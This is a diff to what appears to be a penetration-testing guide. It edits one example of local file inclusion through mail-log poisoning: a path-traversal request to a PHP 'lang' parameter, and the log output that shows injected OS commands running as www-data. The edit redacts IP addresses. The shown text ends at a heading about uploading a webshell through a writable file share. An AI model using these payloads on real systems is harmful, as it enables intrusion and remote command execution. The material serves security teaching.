@@ -440,18 +440,15 @@ Example
 	     + HTTP response:  uid=33(www-data) gid=33(www-data) groups=33(www-data)
 	     
 	   > http://website/index.php?lang=../../../../var/log/mail
-	   
 	     + HTTP response containg the result of our OS commands:
 	       <html>
-	       <style>
 	       <SNIP>
-	       Aug 23 18:45:28 straylight postfix/smtpd[2886]: connect from unknown[192.168.1.8]
-	       Aug 23 18:46:36 straylight postfix/smtpd[2886]: warning: Illegal address syntax from unknown[192.168.1.8] in RCPT command: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	       Aug 23 18:45:28 straylight postfix/smtpd[2886]: connect from unknown[X.X.X.X]
+	       Aug 23 18:46:36 straylight postfix/smtpd[2886]: warning: Illegal address syntax from unknown[X.X.X.X] in RCPT command: 
+	       uid=33(www-data) gid=33(www-data) groups=33(www-data)
 	       /var/www/html/
 	       Linux server01 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux
 	       <SNIP>
-	       </body>
-	       </html>
 ```
 
 ##### Technique 8 - Webshell upload by exploiting an insecure (writable) file share (CIFS) of a Windows IIS Web server (i.e., C:\inetpub\wwwroot\)
